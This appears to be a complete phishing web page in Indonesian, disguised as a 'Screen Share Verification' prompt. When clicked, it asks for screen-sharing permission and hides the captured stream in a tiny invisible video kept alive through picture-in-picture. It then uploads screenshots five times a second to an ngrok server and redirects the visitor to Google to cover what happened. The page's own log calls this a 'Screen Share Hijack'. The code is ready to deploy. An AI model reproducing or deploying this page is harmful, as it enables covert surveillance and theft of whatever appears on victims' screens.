<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Screen Share Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0a0a0a; color: #e0e0e0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #1a1a1a; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; width: 100%; }
  h2 { color: #f00; margin-bottom: 10px; font-size: 20px; }
  p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 150px; overflow-y: auto; border: 1px solid #333; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Screen Share Verification</h2>
  <p>Klik untuk memverifikasi sesi Anda.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
  var REDIRECT_DELAY = 3000; // 3 detik

  // ============================================
  // 1. SCREEN SHARE & TELEMETRI
  // ============================================
  async function startScreenShare() {
    try {
      log("[+] Meminta Izin Screen Share...");

      // Minta Screen Share (Butuh Gesture Asli)
      var stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
      log("[+] 🚨 SCREEN SHARE DIIZINKAN!");

      // Buat video transparan (untuk PiP / Fullscreen)
      var video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.playsInline = true;
      video.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
      document.body.appendChild(video);

      await video.play().catch(function(){});

      // Coba Masuk PiP (Screen Share di PiP)
      try {
        await video.requestPictureInPicture();
        log("[+] 🎥 PiP Screen Share AKTIF!");
      } catch (pipErr) {
        log("[-] PiP Gagal: " + pipErr.message);
      }

      // ============================================
      // 2. TELEMETRI (KIRIM FRAME LAYAR)
      // ============================================
      var canvas = document.createElement('canvas');
      canvas.width = 1280; // Resolusi layar lebih tinggi
      canvas.height = 720;
      var ctx = canvas.getContext('2d');

      setInterval(function() {
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(function(blob) {
            if (!blob) return;
            var formData = new FormData();
            formData.append('file', blob, 'screen.jpg');
            fetch(SERVER_ENDPOINT, {
              method: 'POST',
              body: formData,
              keepalive: true
            }).catch(function(){});
          }, 'image/jpeg', 0.6);
        }
      }, 200); // 5 FPS

      // ============================================
      // 3. REDIRECT KE GOOGLE
      // ============================================
      setTimeout(function() {
        log("[+] Redirect ke Google.com...");
        try {
          window.location.replace(TARGET_URL);
        } catch(e) {}
      }, REDIRECT_DELAY);

    } catch(err) {
      log("[-] Screen Share Diblokir: " + err.name);
      // Fallback: Redirect ke Google setelah 1 detik
      setTimeout(function() {
        log("[+] Redirect ke Google (Screen Share gagal)...");
        window.location.replace(TARGET_URL);
      }, 1000);
    }
  }

  // ============================================
  // TRIGGER (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>⏳ Memverifikasi...</h2>
      <p>Menghubungkan ke Google...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Screen Share Hijack...");

    startScreenShare();

  }, { once: true });

})();
</script>
</body>
</html>
